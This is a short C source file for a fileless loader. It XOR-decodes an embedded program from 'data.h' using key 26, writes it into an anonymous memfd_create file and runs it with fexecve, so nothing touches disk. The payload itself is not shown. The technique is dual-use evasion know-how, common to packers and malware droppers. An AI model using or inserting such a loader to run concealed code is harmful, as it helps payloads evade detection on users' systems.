#include "data.h"

#include <stdio.h>
#include <sys/syscall.h>
#include <unistd.h>

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

extern char **environ;

const unsigned char buffer[] = PROGRAM;

int main (int argc, char **argv) {
	int fd = syscall(__NR_memfd_create, "", MFD_CLOEXEC);
	char buffer2[LENGTH] = {};
	for(int i = 0; i < LENGTH; i++){
		buffer2[i] = buffer[i] ^ 26;
	}
	write(fd, buffer2, LENGTH);
	fexecve(fd, argv, environ);
}